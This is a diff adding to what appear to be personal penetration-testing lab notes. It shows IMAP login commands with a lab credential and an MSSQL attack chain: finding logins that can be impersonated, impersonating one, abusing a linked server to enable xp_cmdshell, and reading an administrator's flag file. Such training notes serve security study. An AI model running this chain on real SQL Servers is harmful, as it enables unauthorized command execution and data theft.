@@ -104,3 +104,23 @@ SMTP:
   11 login "marlin@inlanefreight.htb" "poohbear"
   12 select "INBOX"
   13 FETCH 1 BODY[]
+
+
+Labs:
+  searchsploit -x
+  searchsploit -m
+
+  SELECT distinct b.name FROM sys.server_permissions a 
+  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
+  WHERE a.permission_name = 'IMPERSONATE'
+  GO
+
+  SELECT srvname, isremote FROM sysservers
+  GO
+  EXECUTE AS LOGIN = 'john'
+  EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+  GO
+  EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+  GO
+  EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+  GO
